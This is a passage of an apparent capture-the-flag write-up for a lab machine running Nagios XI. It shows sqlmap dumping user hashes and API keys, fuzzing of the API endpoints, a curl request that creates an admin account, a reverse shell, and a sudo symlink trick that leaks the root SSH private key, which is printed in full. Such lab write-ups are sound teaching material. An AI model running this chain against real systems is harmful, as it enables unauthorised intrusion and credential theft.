| svc         | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK |
| nagiosadmin | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL |
+-------------+--------------------------------------------------------------+------------------------------------------------------------------+

[22:45:46] [INFO] table 'nagiosxi.xi_users' dumped to CSV file '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv'
[22:45:46] [INFO] fetched data logged to text files under '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb'

[*] ending @ 22:45:46 /2024-05-11/
```

The passwords are not crackable but we have the nagiosadmin api_key, let's fuzz for other api endpoints with this new api token with the apikey parameter (as showed in the [video](https://support.nagios.com/kb/category.php?id=105) from the nagios xi api documentation) and a special dictionary for api endpoints:

```bash
❯ feroxbuster --url https://nagios.monitored.htb/nagiosxi/api/v1 --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -k -w /opt/SecLists/Discovery/Web-Content/api/objects.txt
                                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/api/v1
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/api/objects.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🤔  Query Parameter       │ apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        3w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      283c https://nagios.monitored.htb/nagiosxi/api/nagiosxi/api/v1?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
404      GET        9l       31w      283c https://nagios.monitored.htb/nagiosxi/api/nagiosxi/?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
404      GET        9l       31w      283c https://nagios.monitored.htb/nagiosxi/api/nagiosxi/api/?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
301      GET        9l       28w      412c https://nagios.monitored.htb/nagiosxi/api/v1?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL => https://nagios.monitored.htb/nagiosxi/api/v1/?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        4w       32c https://nagios.monitored.htb/nagiosxi/api/v1/0?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/config?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
404      GET        1l        4w       24c https://nagios.monitored.htb/nagiosxi/api/v1/lost%2Bfound?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/objects?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/system?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/User?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
[####################] - 3m      3136/3136    0s      found:12      errors:156    
[####################] - 3m      3133/3133    21/s    https://nagios.monitored.htb/nagiosxi/api/v1/ 
```

# Access as nagios

Searching for vulnerabilities for this api endpoints, we can use /system/user endpoint to [add a new user](https://www.exploit-db.com/exploits/44560) with admin privileges and chain it to the tipical nagios xi authenticated rce in the commands section:

```bash
❯ curl -s -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d 'username=test&password=test&name=test&email=test%40test.com&auth_level=admin&force_pw_change=0' -k
{"success":"User account test was added successfully!","user_id":6}
```

Now we can login with this user, accept the license agreement and go into Configure > Core config manager > Commands:

![Nagios XI commands](/assets/images/Monitored/nagiosxi_commands.png)

And add a new command to give you a reverse shell:

![Add command](/assets/images/Monitored/execute_command.png)

Now, in the menu Monitoring go to Hosts > localhost, select your command, and click on check command:

![Run command](/assets/images/Monitored/run_command.png)

Now we receive the shell:

![Shell received](/assets/images/Monitored/shell_received.png)

Now, stabilize the tty with this commands:

```bash
nagios@monitored:~$ script /dev/null -c bash  
script script /dev/null -c bash
Script started, output log file is 'script'.
nagios@monitored:~$ ^Z
[1]  + 668926 suspended  nc -lvnp 443
❯ stty raw -echo;fg
[1]  + 668926 continued  nc -lvnp 443
                                     reset xterm
nagios@monitored:~$ export TERM=xterm
nagios@monitored:~$ export SHELL=bash
nagios@monitored:~$ stty rows <your rows> columns <your columns>
```

* ``script /dev/null -c bash``: Spawns a tty.
* ``ctrl+z``: puts the shell in background for later doing a treatment.
* ``stty raw -echo;fg``: give us the shell back again.
* ``reset xterm``: resets the terminal to give us the bash console.
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal.
* ``export SHELL=bash``: specifies the system that we are using a bash console.
* ``stty rows <YOUR ROWS> columns <YOUR COLUMNS>``: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you can view it with `stty size` in a complete new window).

# Privilege escalation to root

If we look at sudo -l, we can run a lot of commands:

```bash
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

Let's analyze the getprofile.sh script.
First, it gets a parameter for a folder and verifies that all the characters are alphanumeric:

```bash
# GRAB THE ID
folder=$1
if [ "$folder" == "" ]; then
    echo "You must enter a folder name/id to generate a profile."
    echo "Example: ./getprofile.sh <id>"
    exit 1
fi
```

Then, it takes the content of a lot of files with tail and saves it into /usr/local/nagiosxi/var/components/profile/$folder/logs/{file}:

```bash
echo "Creating nagios.txt..."
nagios_log_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//')
tail -n500 "$nagios_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"

echo "Creating perfdata.txt..."
perfdata_log_file=$(cat /usr/local/nagios/etc/pnp/process_perfdata.cfg | sed -n -e 's/^LOG_FILE = //p')
tail -n500 "$perfdata_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdata.txt"

echo "Creating npcd.txt..."
npcd_log_file=$(cat /usr/local/nagios/etc/pnp/npcd.cfg | sed -n -e 's/^log_file = //p')
tail -n500 "$npcd_log_file" &> "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/npcd.txt"

echo "Creating cmdsubsys.txt..."
tail -n500 /usr/local/nagiosxi/var/cmdsubsys.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/cmdsubsys.txt"

echo "Creating event_handler.txt..."
tail -n500 /usr/local/nagiosxi/var/event_handler.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/event_handler.txt"

echo "Creating eventman.txt..."
tail -n500 /usr/local/nagiosxi/var/eventman.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/eventman.txt"

echo "Creating perfdataproc.txt..."
tail -n500 /usr/local/nagiosxi/var/perfdataproc.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdataproc.txt"

echo "Creating sysstat.txt..."
tail -n500 /usr/local/nagiosxi/var/sysstat.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/sysstat.txt"

echo "Creating systemlog.txt..."
if [ -f /var/log/messages ]; then
    /usr/bin/tail -n1000 /var/log/messages > "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
elif [ -f /var/log/syslog ]; then
    /usr/bin/tail -n1000 /var/log/syslog > "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
fi

echo "Retrieving all snmp logs..."
if [ -f /var/log/snmptrapd.log ]; then
    /usr/bin/tail -n1000 /var/log/snmptrapd.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptrapd.txt"
fi
if [ -f /var/log/snmptt/snmptt.log ]; then
    /usr/bin/tail -n1000 /var/log/snmptt/snmptt.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptt.txt"
fi
if [ -f /var/log/snmptt/snmpttsystem.log ]; then
    /usr/bin/tail -n1000 /var/log/snmptt/snmpttsystem.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttsystem.txt"
fi
if [ -f /var/log/snmpttunknown.log ]; then
    /usr/bin/tail -n1000 /var/log/snmpttunknown.log > "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttunknown.log.txt"
fi

```

And backup them into the folder:

```bash
## temporarily change to that directory, zip, then leave
(
    ts=$(date +%s)
    cd /usr/local/nagiosxi/var/components/profile
    mv "$folder" "profile-$ts"
    zip -r profile.zip "profile-$ts"
    rm -rf "profile-$ts"
    mv -f profile.zip ../
)
```

The problem here is that the file phpmailer.log is writable by the user nagios and we can link it to /root/.ssh/id_rsa to exploit this vulnerability by following this steps:

Link the id_rsa file to phpmailer.log:

```
nagios@monitored:~$ ls -l /usr/local/nagiosxi/tmp/phpmailer.log
-rw-r--r-- 1 nagios nagios 0 Nov 10  2023 /usr/local/nagiosxi/tmp/phpmailer.log
nagios@monitored:~$ ln -s -f /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log 
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
mv: cannot stat '/usr/local/nagiosxi/tmp/profile-1.html': No such file or directory
-------------------Fetching Information-------------------
Please wait.......
Creating system information...
Creating nagios.txt...
Creating perfdata.txt...
Creating npcd.txt...
Creating cmdsubsys.txt...
Creating event_handler.txt...
Creating eventman.txt...
Creating perfdataproc.txt...
Creating sysstat.txt...
Creating systemlog.txt...
Retrieving all snmp logs...
Creating apacheerrors.txt...
Creating mysqllog.txt...
Getting xi_users...
Getting xi_usermeta...
Getting xi_options(mail)...
Getting xi_otions(smtp)...
Creating a sanatized copy of config.inc.php...
Creating memorybyprocess.txt...
Creating filesystem.txt...
Dumping PS - AEF to psaef.txt...
Creating top log...
Creating sar log...
Copying objects.cache...
Copying MRTG Configs...
tar: Removing leading `/' from member names
Counting Performance Data Files...
Counting MRTG Files...
Getting Network Information...
Getting CPU info...
Getting memory info...
Getting ipcs Information...
Getting SSH terminal / shellinabox yum info...
Getting Nagios Core version...
Getting NPCD version...
Getting NRPE version...
Getting NSCA version...
Getting NagVis version...
Getting WKTMLTOPDF version...
Getting Nagios-Plugins version...
Getting BPI configs...
Getting Firewall information...
Getting maillog...
tail: cannot open '/var/log/maillog' for reading: No such file or directory
Getting phpmailer.log...
Getting nom data...
ls: cannot access '/usr/local/nagiosxi/nom/checkpoints/nagioscore/errors/*.txt': No such file or directory
ls: cannot access '/usr/local/nagiosxi/nom/checkpoints/nagioscore/errors/*.tar.gz': No such file or directory
cp: cannot stat '': No such file or directory
cp: cannot stat '': No such file or directory
Zipping logs directory...
  adding: profile-1715465825/ (stored 0%)
  adding: profile-1715465825/config.inc.php (deflated 70%)
  adding: profile-1715465825/xi_usermeta.txt (deflated 97%)
  adding: profile-1715465825/iptables.txt (deflated 36%)
  adding: profile-1715465825/top.txt (deflated 83%)
  adding: profile-1715465825/ip_addr.txt (deflated 57%)
  adding: profile-1715465825/filesystem.txt (deflated 56%)
  adding: profile-1715465825/ipcs.txt (deflated 58%)
  adding: profile-1715465825/mrtg.tar.gz (stored 0%)
  adding: profile-1715465825/nagios-logs/ (stored 0%)
  adding: profile-1715465825/nagios-logs/event_handler.txt (deflated 98%)
  adding: profile-1715465825/nagios-logs/eventman.txt (deflated 98%)
  adding: profile-1715465825/nagios-logs/sysstat.txt (deflated 91%)
  adding: profile-1715465825/nagios-logs/cmdsubsys.txt (deflated 91%)
  adding: profile-1715465825/nagios-logs/nagios.txt (deflated 84%)
  adding: profile-1715465825/nagios-logs/perfdata.txt (deflated 12%)
  adding: profile-1715465825/nagios-logs/npcd.txt (deflated 91%)
  adding: profile-1715465825/nagios-logs/perfdataproc.txt (deflated 96%)
  adding: profile-1715465825/maillog (stored 0%)
  adding: profile-1715465825/xi_options_mail.txt (deflated 88%)
  adding: profile-1715465825/xi_users.txt (deflated 71%)
  adding: profile-1715465825/meminfo.txt (deflated 52%)
  adding: profile-1715465825/xi_options_smtp.txt (stored 0%)
  adding: profile-1715465825/versions/ (stored 0%)
  adding: profile-1715465825/versions/shellinabox.txt (deflated 38%)
  adding: profile-1715465825/versions/nrpe.txt (stored 0%)
  adding: profile-1715465825/versions/nagvis.txt (stored 0%)
  adding: profile-1715465825/versions/wkhtmltopdf.txt (stored 0%)
  adding: profile-1715465825/versions/nagios.txt (deflated 40%)
  adding: profile-1715465825/versions/npcd.txt (deflated 39%)
  adding: profile-1715465825/versions/nagios-plugins.txt (deflated 2%)
  adding: profile-1715465825/versions/nsca.txt (deflated 23%)
  adding: profile-1715465825/objects.cache (deflated 88%)
  adding: profile-1715465825/sar.txt (deflated 62%)
  adding: profile-1715465825/1715463603.tar.gz (deflated 0%)
  adding: profile-1715465825/phpmailer.log (deflated 24%)
  adding: profile-1715465825/psaef.txt (deflated 83%)
  adding: profile-1715465825/nom/ (stored 0%)
  adding: profile-1715465825/nom/checkpoints/ (stored 0%)
  adding: profile-1715465825/nom/checkpoints/nagioscore/ (stored 0%)
  adding: profile-1715465825/nom/checkpoints/nagioscore/errors/ (stored 0%)
  adding: profile-1715465825/nom/checkpoints/nagiosxi/ (stored 0%)
  adding: profile-1715465825/nom/checkpoints/nagiosxi/1715463603_nagiosql.sql.gz (deflated 0%)
  adding: profile-1715465825/cpuinfo.txt (deflated 69%)
  adding: profile-1715465825/hostinfo.txt (stored 0%)
  adding: profile-1715465825/logs/ (stored 0%)
  adding: profile-1715465825/logs/other_vhosts_access.log.1.txt (deflated 98%)
  adding: profile-1715465825/logs/error.log.txt (deflated 89%)
  adding: profile-1715465825/logs/error.log.2.gz.txt (stored 0%)
  adding: profile-1715465825/logs/snmpttsystem.txt (deflated 60%)
  adding: profile-1715465825/logs/database_host.txt (deflated 3%)
  adding: profile-1715465825/logs/other_vhosts_access.log.txt (deflated 97%)
  adding: profile-1715465825/logs/other_vhosts_access.log.2.gz.txt (stored 0%)
  adding: profile-1715465825/logs/messages.txt (deflated 85%)
  adding: profile-1715465825/logs/access.log.txt (deflated 97%)
  adding: profile-1715465825/logs/error.log.1.txt (deflated 57%)
  adding: profile-1715465825/file_counts.txt (deflated 46%)
  adding: profile-1715465825/memorybyprocess.txt (deflated 82%)
  adding: profile-1715465825/bpi/ (stored 0%)
  adding: profile-1715465825/bpi/bpi.conf (deflated 42%)
Backup and Zip complete!
```

Copy the file to /tmp and unzip it:

```bash
nagios@monitored:/tmp$ cd /tmp/
nagios@monitored:/tmp$ cp /usr/local/nagiosxi/var/components/profile.zip .
Archive:  profile.zip
   creating: profile-1715465825/
  inflating: profile-1715465825/config.inc.php  
  inflating: profile-1715465825/xi_usermeta.txt  
  inflating: profile-1715465825/iptables.txt  
  inflating: profile-1715465825/top.txt  
  inflating: profile-1715465825/ip_addr.txt  
  inflating: profile-1715465825/filesystem.txt  
  inflating: profile-1715465825/ipcs.txt  
 extracting: profile-1715465825/mrtg.tar.gz  
   creating: profile-1715465825/nagios-logs/
  inflating: profile-1715465825/nagios-logs/event_handler.txt  
  inflating: profile-1715465825/nagios-logs/eventman.txt  
  inflating: profile-1715465825/nagios-logs/sysstat.txt  
  inflating: profile-1715465825/nagios-logs/cmdsubsys.txt  
  inflating: profile-1715465825/nagios-logs/nagios.txt  
  inflating: profile-1715465825/nagios-logs/perfdata.txt  
  inflating: profile-1715465825/nagios-logs/npcd.txt  
  inflating: profile-1715465825/nagios-logs/perfdataproc.txt  
 extracting: profile-1715465825/maillog  
  inflating: profile-1715465825/xi_options_mail.txt  
  inflating: profile-1715465825/xi_users.txt  
  inflating: profile-1715465825/meminfo.txt  
 extracting: profile-1715465825/xi_options_smtp.txt  
   creating: profile-1715465825/versions/
  inflating: profile-1715465825/versions/shellinabox.txt  
 extracting: profile-1715465825/versions/nrpe.txt  
 extracting: profile-1715465825/versions/nagvis.txt  
 extracting: profile-1715465825/versions/wkhtmltopdf.txt  
  inflating: profile-1715465825/versions/nagios.txt  
  inflating: profile-1715465825/versions/npcd.txt  
  inflating: profile-1715465825/versions/nagios-plugins.txt  
  inflating: profile-1715465825/versions/nsca.txt  
  inflating: profile-1715465825/objects.cache  
  inflating: profile-1715465825/sar.txt  
  inflating: profile-1715465825/1715463603.tar.gz  
  inflating: profile-1715465825/phpmailer.log  
  inflating: profile-1715465825/psaef.txt  
   creating: profile-1715465825/nom/
   creating: profile-1715465825/nom/checkpoints/
   creating: profile-1715465825/nom/checkpoints/nagioscore/
   creating: profile-1715465825/nom/checkpoints/nagioscore/errors/
   creating: profile-1715465825/nom/checkpoints/nagiosxi/
  inflating: profile-1715465825/nom/checkpoints/nagiosxi/1715463603_nagiosql.sql.gz  
  inflating: profile-1715465825/cpuinfo.txt  
 extracting: profile-1715465825/hostinfo.txt  
   creating: profile-1715465825/logs/
  inflating: profile-1715465825/logs/other_vhosts_access.log.1.txt  
  inflating: profile-1715465825/logs/error.log.txt  
 extracting: profile-1715465825/logs/error.log.2.gz.txt  
  inflating: profile-1715465825/logs/snmpttsystem.txt  
  inflating: profile-1715465825/logs/database_host.txt  
  inflating: profile-1715465825/logs/other_vhosts_access.log.txt  
 extracting: profile-1715465825/logs/other_vhosts_access.log.2.gz.txt  
  inflating: profile-1715465825/logs/messages.txt  
  inflating: profile-1715465825/logs/access.log.txt  
  inflating: profile-1715465825/logs/error.log.1.txt  
  inflating: profile-1715465825/file_counts.txt  
  inflating: profile-1715465825/memorybyprocess.txt  
   creating: profile-1715465825/bpi/
  inflating: profile-1715465825/bpi/bpi.conf  
```

View the id_rsa:

```
nagios@monitored:/tmp$ cat profile-1715465825/phpmailer.log
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

And ssh as root:

```bash
❯ cat id_rsa
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN OPENSSH PRIVATE KEY-----
   2   │ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
   3   │ NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
   4   │ FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
   5   │ z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V
   6   │ bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89
   7   │ 9MxTIZrV6uv4/iJyPiK1LtHPfhRuFI3xe6Sfy7//UxGZmshi23mvavPZ6Zq0qIOmvNTu17
   8   │ V5wg5aAITUJ0VY9xuIhtwIAFSfgGAF4MF/P+zFYQkYLOqyVm++2hZbSLRwMymJ5iSmIo4p
   9   │ lbxPjGZTWJ7O/pnXzc5h83N2FSG0+S4SmmtzPfGntxciv2j+F7ToMfMTd7Np9/lJv3Yb8J
  10   │ /mxP2qnDTaI5QjZmyRJU3bk4qk9shTnOpXYGn0/hAAAFiJ4coHueHKB7AAAAB3NzaC1yc2
  11   │ EAAAGBAJ2WJ5RttjnZ8WmivfAyTHPYrLkoIPcLYwtK9Yk85UkVYTQC7UndghUiDY9W8qnj
  12   │ pK4ngvBba7XvvXk6735OyqWvFh9EtC7KLQEk144+EArjnJoKvSJuUg4VRu/8/WhMGt26PL
  13   │ uOfu2/s0gyiKJVZBqIAOm9sHXuRN8JBxw1F326cECqVEafaABB31BkgyaelW6JOe3up0vc
  14   │ OJo9uEeLo4OPDV8zMmPPLoY9x8A8YtPe3THDfFryFc3Pv5Az1AD5vpf/MPPfTMUyGa1err
  15   │ +P4icj4itS7Rz34UbhSN8Xukn8u//1MRmZrIYtt5r2rz2ematKiDprzU7te1ecIOWgCE1C
  16   │ dFWPcbiIbcCABUn4BgBeDBfz/sxWEJGCzqslZvvtoWW0i0cDMpieYkpiKOKZW8T4xmU1ie
  17   │ zv6Z183OYfNzdhUhtPkuEpprcz3xp7cXIr9o/he06DHzE3ezaff5Sb92G/Cf5sT9qpw02i
  18   │ OUI2ZskSVN25OKpPbIU5zqV2Bp9P4QAAAAMBAAEAAAGAWkfuAQEhxt7viZ9sxbFrT2sw+R
  19   │ reV+o0IgIdzTQP/+C5wXxzyT+YCNdrgVVEzMPYUtXcFCur952TpWJ4Vpp5SpaWS++mcq/t
  20   │ PJyIybsQocxoqW/Bj3o4lEzoSRFddGU1dxX9OU6XtUmAQrqAwM+++9wy+bZs5ANPfZ/EbQ
  21   │ qVnLg1Gzb59UPZ51vVvk73PCbaYWtIvuFdAv71hpgZfROo5/QKqyG/mqLVep7mU2HFFLC3
  22   │ dI0UL15F05VToB+xM6Xf/zcejtz/huui5ObwKMnvYzJAe7ViyiodtQe5L2gAfXxgzS0kpT
